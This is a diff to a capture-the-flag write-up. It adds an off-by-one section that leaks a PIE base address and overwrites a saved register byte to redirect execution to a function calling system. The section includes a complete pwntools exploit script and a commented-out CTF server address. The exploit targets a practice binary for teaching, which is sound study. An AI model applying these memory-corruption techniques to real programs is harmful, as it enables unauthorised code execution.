@@ -138,8 +138,8 @@ p.interactive()
 ```
 
 ![alt text](/images/image-5.png)
-
 ---
+
 ### Return Oriented Programming (ROP)
 
 ![alt text](/images/image-1-2.png)
@@ -379,5 +379,73 @@ assert(len(payload) < (0x158 - 0x78)): Make sure that the size of the entire pay
 ```
 
 ![alt text](/images/image-10-3.png)
+---
 
 ### Off-By-One
+
+Decompile with Ghidra:
+
+![alt text](/images/image-3-4.png)
+![alt text](/images/image-4-4.png)
+
+![alt text](/images/image-4-0.png)
+
+When run, the program prints an FYI value, and because of `PIE`, each time we run we receive a different FYI value.
+
+![alt text](/images/image-1-4.png)
+
+FYI the value that the program prints is the address of the `init()` function. So we can leak the base value of the binary from the `init()` function address.
+
+![alt text](/images/image-2-4.png)
+
+```
+p.recvuntil(b'FYI: ')
+fyi = p.recv(10)
+exe.base = int(fyi,16) - exe.sym.init
+log.info('Binary Base: ' + hex(exe.base))
+```
+
+![alt text](/images/image-5-4.png)
+
+The `gets_h` function contains the `system` function, so the goal is to control the program to get to that `gets_h` function. So it is necessary to change the `ret` address of the `main` function to the `gets_h` function address.
+
+![alt text](/images/image-7-4.png)
+
+After entering the input, we can see:
+
+At `main+108`, the value `ebp - 8` will pop into `ecx` (`0xffffca80`), then `ret` will be at address `ecx - 4` (0xffffca7c). So if we can control the value of `ecx`, we can control `ret`.
+
+`read` allows to enter up to 17 bytes so we can completely control `ecx` with the 17th byte. (`a0`). So just overwrite `a0` with `80` and we will return to the `gets_h` function.
+
+However, because the program turns on `PIE`, the stack address will also change after each run, so we cannot know the exact value of that overwritten byte. Therefore, the ratio will be 1/16.
+
+```
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./obo_patched", checksec = False)
+libc = ELF("./libc.so.6", checksec = False)
+ld = ELF("./ld-linux.so.2", checksec = False)
+
+context.binary = exe
+p = process(exe.path)
+# p = remote("188.166.252.88", 13373)
+
+### LEAK LIBC ###
+p.recvuntil(b'FYI: ')
+fyi = p.recv(10)
+exe.base = int(fyi,16) - exe.sym.init
+log.info('Binary Base: ' + hex(exe.base))
+
+### GET FLAG ###
+flag = exe.sym.gets_h + exe.base
+payload = b'A' * 12 + p32(flag) + b'\x80'       # b'\x80' - select any byte
+p.sendlineafter(b'2024: ', payload)
+
+p.interactive()
+```
+![alt text](/images/image-6-4.png)
+
+---
+### Integer Overflow & Signal
